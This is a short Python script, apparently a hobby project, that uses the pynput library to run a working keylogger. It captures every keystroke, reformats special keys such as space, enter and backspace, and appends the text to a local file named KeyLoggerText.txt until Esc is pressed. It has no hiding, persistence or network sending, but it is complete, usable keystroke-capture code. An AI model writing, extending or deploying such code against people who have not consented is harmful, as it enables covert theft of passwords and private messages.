import pynput

from pynput.keyboard import Key, Listener

keys = []
count = 0
blanksDict = {'space': ' ', 'enter': '\n', 'tab': '\t'}

def on_press(key):
	global keys
#	if count >= 2:	
		#	Can be used to change the write frequency.
		#	Put the below 3 lines in indentation if wanting to change the write frequency.
	keys.append(key)
	write_file(keys)
	keys = []
	
def write_file(keys):
	with open('KeyLoggerText.txt', 'a') as writeFile:
		for key in keys:

			if "'" in str(key):
				k = str(key).replace("'", "")
				writeFile.write(str(k))

			elif 'backspace' in str(key):
				k = str(key).replace("Key.", "")
				writeFile.write(f'"{str(k)}"')

			elif 'space' in str(key) or 'enter'in str(key) or 'tab' in str(key):
				for changeBlankKey in blanksDict:
					if changeBlankKey in str(key):
						writeFile.write(blanksDict[changeBlankKey])

			elif 'shift' in str(key):
				pass

			else:
				k = str(key).replace("Key.", "")
				writeFile.write(f'"{str(k)}"')

def on_release(key):
	# Stop the listener
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
